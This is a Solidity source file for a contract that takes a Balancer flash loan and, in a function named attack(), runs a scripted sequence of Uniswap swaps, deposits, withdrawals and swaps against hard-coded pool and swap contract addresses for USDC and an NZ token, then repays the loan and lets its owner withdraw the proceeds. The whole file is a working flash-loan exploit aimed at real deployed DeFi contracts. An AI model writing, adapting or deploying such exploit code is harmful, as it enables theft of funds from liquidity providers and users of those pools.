// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
pragma abicoder v2;

import '@uniswap/v3-periphery/contracts/libraries/TransferHelper.sol';
import '@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol';
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "IFlashLoanRecipient.sol";
import "IBalancerVault.sol";
import "hardhat/console.sol";

pragma solidity ^0.8.0;

interface Pool {
    function deposit(uint256 _deposit,
    uint256 _minQuoteAmount,
    uint256 _minBaseAmount,
    uint256 _maxQuoteAmount,
    uint256 _maxBaseAmount,
    uint256 _deadline) external;

    function withdraw(uint256 _curvesToBurn,uint256 _deadline) external;
    function approve(address _spender, uint256 _amount) external;
    function balanceOf(address _account) external returns(uint256);

    function viewTargetSwap(
		address _origin,
		address _target,
		uint256 _targetAmount
	) external returns (uint256 originAmount_);

    	function viewOriginSwap(
		address _origin,
		address _target,
		uint256 _originAmount
	)
		external
		returns (uint256 targetAmount_);

    function targetSwap(
		address _origin,
		address _target,
		uint256 _maxOriginAmount,
		uint256 _targetAmount,
		uint256 _deadline
	) external;
}

interface USDC {
    function approve(address spender, uint256 value) external;
    function balanceOf(address account) external returns(uint256);
    function transfer (address to, uint256 value) external;
}

interface NZ {
    function approve(address spender, uint256 value) external;
    function balanceOf(address account) external returns(uint256);
}

interface Swap {
    function originSwap(address _quoteCurrency,
    address _origin,
    address _target,
    uint256 _originAmount,
    uint256 _minTargetAmount,
    uint256 _deadline) external;

    function viewOriginSwap(
		address _quoteCurrency,
		address _origin,
		address _target,
		uint256 _originAmount
	) external returns (uint256 targetAmount_);
}

interface DAI {
    function approve(address spender, uint256 amount) external;
    function balanceOf(address account) external returns(uint256);
}

contract BalancerFlashLoan is IFlashLoanRecipient{
    using SafeMath for uint256;
    IERC20 public token;
    ISwapRouter public immutable swapRouter;
    uint24 public poolFee;
    address public tokenIn;
    address public tokenOut;
    address private owner;
    address public immutable vaultContractAddress = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address public usdcContractAddress = 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359;
    address public nzContractAddress = 0xFbBE4b730e1e77d02dC40fEdF9438E2802eab3B5;
    address public poolContractAddress = 0xdcb7efACa996fe2985138bF31b647EFcd1D0901a;
    address public swapContractAddress = 0x0C1F53e7b5a770f4C0d4bEF139F752EEb08de88d;
    address public daiContractAddress = 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063;

    constructor(ISwapRouter _swapRouter) {
        swapRouter = _swapRouter;
        owner = msg.sender;
        poolFee = 100; // Default pool fee
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the contract owner can call this function");
        _;
    }

    receive() external payable {
    }

    function attack() public {
        DAI dai = DAI(daiContractAddress);
        USDC usdc = USDC(usdcContractAddress);

        setPoolFee(100);
        setTokenIn(daiContractAddress);
        setTokenOut(usdcContractAddress);

        dai.approve(0xE592427A0AEce92De3Edee1F18E0157C05861564, dai.balanceOf(address(this)));
        usdc.approve(address(this), 100000000000000000000000);

        swapExactInputSingle(dai.balanceOf(address(this)));

        performswap();
        perform();
        performswaprevert();
        perform1();
        performswaprevert();

        setPoolFee(100);
        setTokenIn(usdcContractAddress);
        setTokenOut(daiContractAddress);

        usdc.approve(address(this), usdc.balanceOf(address(this)));
        dai.approve(0xE592427A0AEce92De3Edee1F18E0157C05861564, 100000000000000000000000);

        swapExactInputSingle(usdc.balanceOf(address(this)));
    }

    function setTokenIn(address _tokenIn) public  {
        tokenIn = _tokenIn;
    }

    function setTokenOut(address _tokenOut) public  {
        tokenOut = _tokenOut;
    }

    function setPoolFee(uint24 _poolFee) public  {
        poolFee = _poolFee;
    }


    function swapExactInputSingle(uint256 amountIn) public returns (uint256 amountOut) {
        require(tokenIn != address(0) && tokenOut != address(0), "Tokens not set");
        
        TransferHelper.safeApprove(tokenIn, address(swapRouter), amountIn);

        ISwapRouter.ExactInputSingleParams memory params =
            ISwapRouter.ExactInputSingleParams({
                tokenIn: tokenIn,
                tokenOut: tokenOut,
                fee: poolFee,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amountIn,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        amountOut = swapRouter.exactInputSingle(params);
    }


    function performswaprevert() public {
        Pool pool = Pool(poolContractAddress);
        USDC usdc = USDC(usdcContractAddress);
        NZ nz = NZ(nzContractAddress);

        nz.approve(address(this), nz.balanceOf(address(this)));
        nz.approve(poolContractAddress, nz.balanceOf(address(this)));
        nz.approve(swapContractAddress, nz.balanceOf(address(this)));

        usdc.approve(address(this), 100000000000000000000000);
        usdc.approve(poolContractAddress, 100000000000000000000000);
        usdc.approve(swapContractAddress, 100000000000000000000000);

        uint256 balance = pool.viewOriginSwap(nzContractAddress,
        usdcContractAddress, 
        nz.balanceOf(address(this)));

        uint256 deadline = block.timestamp + 1 hours;

        pool.targetSwap(nzContractAddress,
        usdcContractAddress,
        nz.balanceOf(address(this)),
        balance,
        deadline);
    }

    function performswap() public {
        Swap swap = Swap(swapContractAddress);
        USDC usdc = USDC(usdcContractAddress);
        NZ nz = NZ(nzContractAddress);

        usdc.approve(address(this), usdc.balanceOf(address(this)));
        usdc.approve(poolContractAddress, usdc.balanceOf(address(this)));
        usdc.approve(swapContractAddress, usdc.balanceOf(address(this)));

        nz.approve(address(this), 100000000000000000000000);
        nz.approve(poolContractAddress, 100000000000000000000000);
        nz.approve(swapContractAddress, 100000000000000000000000);

        uint256 balance = swap.viewOriginSwap(usdcContractAddress, 
        usdcContractAddress, 
        nzContractAddress, 
        usdc.balanceOf(address(this))) / 2;

        uint256 deadline = block.timestamp + 1 hours;

        swap.originSwap(usdcContractAddress,
        usdcContractAddress,
        nzContractAddress,
        usdc.balanceOf(address(this)) / 2,
        balance - (balance * 5 / 100),
        deadline);
    }

    function perform() public {
    Pool pool = Pool(poolContractAddress);
    USDC usdc = USDC(usdcContractAddress);
    NZ nz = NZ(nzContractAddress);

    // Aprobar transferencias
    usdc.approve(address(this), usdc.balanceOf(address(this)));
    usdc.approve(poolContractAddress, usdc.balanceOf(address(this)));
    usdc.approve(swapContractAddress, usdc.balanceOf(address(this)));

    nz.approve(address(this), nz.balanceOf(address(this)));
    nz.approve(poolContractAddress, nz.balanceOf(address(this)));
    nz.approve(swapContractAddress, nz.balanceOf(address(this)));

    pool.approve(address(this), 1000000000000000000000000000);

    // Calcular el min y max directo sin variables intermedias
    uint256 min = usdc.balanceOf(address(this)) * 95 / 100;
    uint256 max = usdc.balanceOf(address(this)) * 105 / 100;
    
    uint256 minz = nz.balanceOf(address(this)) * 95 / 100;
    uint256 maxnz = nz.balanceOf(address(this)) * 105 / 100;

    uint256 total = (max + min) * 10 ** 12;
    uint256 deadline = block.timestamp + 1 hours;

    pool.deposit(total / 2, min / 2, minz / 2, max / 2, maxnz / 2, deadline);
   }

   function perform1() public {
    Pool pool = Pool(poolContractAddress);
    USDC usdc = USDC(usdcContractAddress);
    NZ nz = NZ(nzContractAddress);

    // Aprobar transferencias
    usdc.approve(address(this), 100000000000000000000000);
    usdc.approve(poolContractAddress, 100000000000000000000000);
    usdc.approve(swapContractAddress,100000000000000000000000 );

    nz.approve(address(this), 100000000000000000000000);
    nz.approve(poolContractAddress, 100000000000000000000000);
    nz.approve(swapContractAddress, 100000000000000000000000);

    pool.approve(address(this), 1000000000000000000000000000);

    uint256 deadline = block.timestamp + 1 hours;

    pool.withdraw(pool.balanceOf(address(this)), deadline);
   }

   function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        for (uint256 i = 0; i < tokens.length; ++i) {
            IERC20 token = tokens[i];
            uint256 amount = amounts[i];
            console.log("borrowed amount:", amount);
            uint256 feeAmount = feeAmounts[i];
            console.log("flashloan fee: ", feeAmount);

            DAI dai = DAI(daiContractAddress);

            dai.approve(vaultContractAddress, 100000000000000000000000);

            attack();

            dai.approve(vaultContractAddress, 100000000000000000000000);

            // Return loan
            token.transfer(vaultContractAddress, amount);
        }
    }

    function flashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) public {
        IBalancerVault(vaultContractAddress).flashLoan(
            IFlashLoanRecipient(address(this)),
            tokens,
            amounts,
            userData
        );
    }


    function withdrawmytoken(IERC20 token) public onlyOwner{
    uint256 balance = token.balanceOf(address(this));

    token.transfer(msg.sender, balance);
    }

    function withdrawusdc() public onlyOwner{
    USDC usdc = USDC(usdcContractAddress);
    uint256 balance = usdc.balanceOf(address(this));

    usdc.transfer(msg.sender, balance);
    }

    function withdrawEther(uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Insufficient Ether balance");
        payable(msg.sender).transfer(amount);
    }
  } 
